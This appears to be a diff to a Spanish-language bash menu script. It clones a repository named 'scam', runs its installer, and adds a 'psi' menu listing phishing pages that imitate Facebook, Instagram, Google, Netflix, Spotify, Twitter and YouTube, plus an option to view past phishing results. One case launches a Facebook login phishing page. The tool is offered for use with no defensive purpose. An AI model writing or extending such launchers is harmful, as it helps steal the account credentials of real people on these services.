@@ -279,8 +279,37 @@ git clone https://github.com/Cesar-Hack-Gray/scam
 cd
 cd scam
 bash install.sh
-./phishing.sh
+clear
+printf "
+$ve LISTO,$am ejecuta el comando$ve said psi$am cada vez que quieras hacer un pishing de alguna página... 
+$re" 
 ;;
+psi)
+printf "
+$ce[$ve 0$ce ]$am Phishing para facebook en computadora
+$ce[$ve 1$ce ]$am Phishing para Facebook en celular
+$ce[$ve 2$ce ]$am Phishing para Facebook "por bloqueo" 
+$ce[$ve 3$ce ]$am Phishing para Facebook "auto likes" 
+$ce[$ve 4$ce ]$am Phishing para Instagram
+$ce[$ve 5$ce ]$am Phishing para google
+$ce[$ve 6$ce ]$am Phishing para Netflix 
+$ce[$ve 7$ce ]$am Phishing para Spotify
+$ce[$ve 8$ce ]$am Phishing para Twiter "auto seguidores"
+$ce[$ve 9$ce ]$am Phishing para YouTube "auto suscriptores" 
+$ce[$ve a$ce ]$am Ver tus phishings anteriores
+$re"
+read -p ">>  " opcion
+cd
+cd scam
+case $opcion in
+1)
+./phishing.sh --use -facebook-pc
+;;
+esac
+;;
+
+
+ 
 
 
 
